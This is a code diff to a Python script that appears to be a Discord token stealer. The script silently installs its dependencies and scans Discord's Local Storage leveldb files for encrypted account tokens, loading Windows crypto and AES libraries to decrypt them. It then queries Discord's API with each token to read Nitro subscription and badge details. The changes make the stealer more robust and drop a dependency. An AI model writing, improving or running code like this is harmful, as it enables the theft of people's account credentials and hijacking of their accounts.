@@ -8,9 +8,8 @@ import urllib.request
 import re
 import base64
 import datetime
-from dateutil import parser
 
-def install_and_import(modules):
+def install_import(modules):
     for module, pip_name in modules:
         try:
             __import__(module)
@@ -18,7 +17,7 @@ def install_and_import(modules):
             subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             os.execl(sys.executable, sys.executable, *sys.argv)
 
-install_and_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])
+install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])
 
 import win32crypt
 from Crypto.Cipher import AES
@@ -65,14 +64,18 @@ def gettokens(path):
     path += "\\Local Storage\\leveldb\\"
     tokens = []
 
+    if not os.path.exists(path):
+        return tokens
+
     for file in os.listdir(path):
         if not file.endswith(".ldb") and file.endswith(".log"):
             continue
 
         try:
-            for line in (x.strip() for x in open(f"{path}{file}", "r", errors="ignore").readlines()):
-                for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
-                    tokens.append(values)
+            with open(f"{path}{file}", "r", errors="ignore") as f:
+                for line in (x.strip() for x in f.readlines()):
+                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
+                        tokens.append(values)
         except PermissionError:
             continue
 
@@ -148,7 +151,7 @@ def main():
                 exp_date = None
                 if has_nitro:
                     badges += f":BadgeSubscriber: "
-                    exp_date = parser.parse(res[0]["current_period_end"]).strftime('%d/%m/%Y at %H:%M:%S')
+                    exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')
 
                 res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token))).read().decode())
                 available = 0
